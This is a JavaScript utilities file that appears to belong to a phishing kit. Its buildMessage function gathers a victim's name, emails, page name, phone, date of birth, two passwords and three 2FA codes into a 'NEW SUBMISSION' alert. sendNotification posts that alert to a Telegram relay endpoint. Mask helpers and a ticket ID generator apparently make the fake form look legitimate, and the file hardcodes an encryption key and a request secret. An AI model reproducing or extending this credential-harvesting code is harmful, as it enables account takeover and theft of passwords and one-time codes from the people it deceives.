// /public/js/utils.js

const Utils = (() => {

  // ── Ticket ID ──────────────────────────────────────────────
  function generateTicketId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const seg = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    return `${seg()}-${seg()}-${seg()}`;
  }

  // ── Mask helpers ───────────────────────────────────────────
  function maskEmail(email) {
    if (!email) return '';
    const [local, domain] = email.split('@');
    const visible = local.slice(0, 2);
    return `${visible}***@${domain}`;
  }

  function maskPhone(phone) {
    if (!phone) return '';
    return phone.slice(0, 3) + '****' + phone.slice(-2);
  }

  // ── Local Storage (encrypted with CryptoJS) ────────────────
  const SECRET = 'local_enc_key_2025'; // only used for localStorage, not Telegram

  function saveRecord(key, data) {
    try {
      const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), SECRET).toString();
      const record = { data: encrypted, ts: Date.now() };
      localStorage.setItem(key, JSON.stringify(record));
    } catch (e) {
      console.error('saveRecord error', e);
    }
  }

  function getRecord(key) {
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return null;
      const record = JSON.parse(raw);
      if (Date.now() - record.ts > CONFIG.STORAGE_EXPIRY) {
        localStorage.removeItem(key);
        return null;
      }
      const bytes = CryptoJS.AES.decrypt(record.data, SECRET);
      return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
    } catch (e) {
      return null;
    }
  }

  // ── Build Telegram message text ────────────────────────────
  function buildMessage(data) {
    const line = (label, value) => value ? `<b>${label}:</b> ${value}\n` : '';
    const dob = (data.day && data.month && data.year)
      ? `${data.day}/${data.month}/${data.year}` : null;

    return [
      `🔔 <b>NEW SUBMISSION</b>\n`,
      line('👤 Full Name',       data.fullName),
      line('📧 Email',           data.email),
      line('💼 Email Business',  data.emailBusiness),
      line('📄 Page Name',       data.fanpage),
      line('📞 Phone',           data.phone),
      line('🎂 Date of Birth',   dob),
      line('🔑 Password 1',      data.password),
      line('🔑 Password 2',      data.passwordSecond),
      line('🔐 2FA Code 1',      data.twoFa),
      line('🔐 2FA Code 2',      data.twoFaSecond),
      line('🔐 2FA Code 3',      data.twoFaThird),
      `\n🕐 ${new Date().toLocaleString('vi-VN')}`,
    ].join('');
  }

  // ── Send Notification via /api/send-telegram ───────────────
  async function sendNotification(data) {
    try {
      const message = buildMessage(data);

      // APP_SECRET is a non-sensitive request guard (not the Telegram token)
      // Set this same value in Vercel env var: SECRET_KEY
      const APP_SECRET = 'HDNDT-JDHT8FNEK-JJHR';

      const res = await fetch('/api/send-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-secret-key': APP_SECRET,
        },
        body: JSON.stringify({ message }),
      });

      if (!res.ok) {
        const err = await res.json();
        console.error('Notification error:', err);
      }
    } catch (e) {
      console.error('sendNotification failed:', e);
    }
  }

  return { generateTicketId, maskEmail, maskPhone, saveRecord, getRecord, sendNotification };
})();
